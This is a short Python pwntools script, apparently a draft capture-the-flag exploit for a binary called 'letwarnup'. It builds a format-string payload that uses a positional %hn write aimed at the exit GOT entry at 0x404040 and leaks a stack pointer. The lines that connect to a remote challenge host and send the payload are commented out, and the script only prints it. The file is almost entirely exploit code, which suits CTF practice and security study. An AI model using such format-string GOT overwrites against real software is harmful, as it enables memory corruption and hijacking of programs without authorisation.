from pwn import *

# r = remote("45.122.249.68",10005)
# r = process("./letwarnup")
# gdb.attach(r)

# main = 0x000000000040122f
exit_got = 0x404040

payload = "%16448p%6$hn%10$p"

print(payload)

# print(r.recv())

# r.sendline(payload)
# r.interactive()